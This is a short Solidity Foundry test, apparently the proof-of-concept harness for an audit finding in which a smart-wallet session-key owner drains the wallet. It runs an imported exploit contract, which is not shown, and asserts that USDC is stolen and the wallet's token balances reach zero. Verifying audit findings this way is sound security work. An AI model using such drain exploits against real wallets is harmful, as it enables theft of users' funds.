// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit} from "./62847-c-01-sessionkey-owner-can-drain-the-smart-wallet-shieldify-n.sol";

contract Finding62847Test is Test {
    function test_exploit_session_key_drains_unlocked_usdc() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.usdc().balanceOf(address(this)), 1000 ether, "USDC stolen");
        assertEq(e.usdc().balanceOf(address(e.wallet())), 0, "wallet USDC");
        assertEq(e.usdt().balanceOf(address(e.wallet())), 0, "wallet USDT");
        assertEq(e.weth().balanceOf(address(e.wallet())), 0, "wallet WETH");
        assertEq(e.wbtc().balanceOf(address(e.wallet())), 0, "wallet WBTC");
        assertEq(e.module().lockedAmount(address(e.usdc())), 0, "USDC was not locked");
    }
}
